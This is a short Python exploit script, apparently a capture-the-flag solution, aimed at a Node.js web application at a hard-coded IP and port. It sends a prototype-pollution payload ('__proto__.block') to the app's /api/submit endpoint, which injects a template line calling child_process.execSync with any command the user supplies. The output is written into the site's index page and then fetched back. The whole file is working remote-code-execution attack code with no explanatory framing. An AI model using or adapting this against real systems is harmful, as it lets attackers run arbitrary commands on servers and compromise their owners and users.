import requests
import sys

#TARGET_URL = "http://localhost:1337"
TARGET_URL = "http://178.128.160.242:31201"
def exploit(cmd):
    data={
        "__proto__.block":{
        "type": "Text", 
        "line": f"console.log(process.mainModule.require('child_process').execSync('{cmd} >/app/views/index.html').toString())"
        },
        "artist.name":"Haigh"
    }

    print(data["__proto__.block"]['line'])

    res=requests.post(TARGET_URL+'/api/submit',json=data)

    print(res.text)

    res=requests.get(TARGET_URL)

    print(res.text)


if __name__=="__main__":
    if len(sys.argv) < 2:
        exit("Usage: python exploit.py <cmd>")
    
    cmd=sys.argv[1]

    exploit(cmd)